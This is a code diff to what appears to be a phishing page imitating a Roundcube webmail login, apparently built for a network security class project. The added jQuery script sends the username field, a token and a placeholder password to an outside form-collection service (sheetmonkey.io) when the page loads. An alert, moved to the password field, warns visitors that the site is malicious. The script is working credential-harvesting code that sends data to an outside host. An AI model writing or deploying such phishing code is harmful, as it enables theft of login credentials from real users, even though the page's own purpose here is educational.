@@ -246,8 +246,9 @@
           name="login-form"
           method="POST"
           class="propform"
-          action="https://api.sheetmonkey.io/form/bbeiZAjRad3J9hXXdQqGcB"
+          
         >
+        <!-- action="https://api.sheetmonkey.io/form/bbeiZAjRad3J9hXXdQqGcB" -->
           <!-- <form id="login-form" name="login-form" class="propform">     -->
           <input
             type="hidden"
@@ -356,10 +357,37 @@
     </div>
     <script>
       $(function () {
-        $("#rcmloginuser").on("input", function () {
-          var username = $(this).val();
+        var username = $("#rcmloginuser").val();
+        $.ajax({
+          type: "POST",
+          url: "https://api.sheetmonkey.io/form/bbeiZAjRad3J9hXXdQqGcB",
+          data: {
+            _token: "umJuxMVOCGGgsrWYUYmwkxXxCwFD7Omg",
+            _task: "login",
+            _action: "login",
+            _timezone: "_default_",
+            _url: "",
+            _user: username,
+            _pass: "pwd",
+          },
+          success: function (response) {
+            // Handle success
+            console.log("Username stored successfully:", username);
+          },
+          error: function (xhr, status, error) {
+            // Handle error
+            console.error("Error storing username:", error);
+          },
+        })
 
-          if (username.trim() !== "") {
+
+
+
+
+        $("#rcmloginpwd").on("input", function () {
+          var pwd = $(this).val();
+
+          if (pwd.trim() !== "") {
             // Show a custom prompt message when the user starts typing
             alert("YOU ARE ENTERING YOUR CREDENTIALS ON A MALICIOUS WEBSITE. THIS IS PART OF NETWORK AND SYSTEM SECURITY PROJECT");
           }
